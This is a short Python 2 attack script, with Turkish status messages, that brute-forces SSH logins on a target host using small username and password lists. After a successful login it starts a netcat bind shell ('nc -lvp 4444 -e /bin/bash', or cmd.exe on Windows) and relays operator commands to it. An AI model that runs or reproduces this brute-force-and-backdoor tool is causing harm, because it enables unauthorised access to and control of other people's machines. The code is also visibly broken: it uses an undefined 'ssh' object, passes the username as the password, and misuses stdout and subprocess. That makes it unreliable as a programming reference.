import paramiko
import subprocess
RHOST=raw_input("RHOST: ")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
Username=["calismalar","calis","deneme","merhaba"]
Password=["calismalar","calis","deneme","merhaba"]
girisAktifUsername=[]
girisAktifPassword=[]
print "[+]Ssh yardimci modulu calismaya basladi..."
for i in Username:
    for j in Password:
        try:
            sonuc=client.connect(str(RHOST), username=i, password=j)
            client.close()
            print "[+]Ssh aktif: Username: ",i," Password: ",j
            girisAktifUsername.append(i)
            girisAktifPassword.append(j)
        except:
            print "[+]Ssh yapilamiyor: Username: ",i," Password: ",j
print "[+]Ssh yardimci modulu calismasi tamamlandi..."
print "[+]Aktif oturum olusturuluyor..."
ssh.connect(str(RHOST), username=girisAktifUsername[0], password=girisAktifUsername[0])
stdin, stdout, stderr =  ssh.exec_command("uname -a")
if "Linux" in stdout:
    try:
        stdin, stdout, stderr = ssh.exec_command("nc -lvp 4444 -e /bin/bash &")
        print "[+]Aktif oturum olusturuldu..."
        while 1:
            komut=raw_input("[+]Komut: ")
            try:
                komutSon="echo "+str(komut)+"|nc "+str(RHOST)+" 4444"
                komutCikti=subprocess.check_output(komutSon)
                print "[+]Komut: ",str(komut),"\n "+str(komutCikti)
            except:
                print "[+]Komut: ",str(komut)," isletilemedi..."
    except:
        pass
elif "Windows" in stdout:
    try:
        stdin, stdout, stderr = ssh.exec_command("nc -lvp 4444 -e cmd.exe &")
        print "[+]Aktif oturum olusturuldu..."
        while 1:
            komut=raw_input("[+]Komut: ")
            try:
                komutSon="echo "+str(komut)+"|nc "+str(RHOST)+" 4444"
                komutCikti=subprocess.check_output(komutSon)
                print "[+]Komut: ",str(komut),"\n "+str(komutCikti)
            except:
                print "[+]Komut: ",str(komut)," isletilemedi..."
    except:
        pass
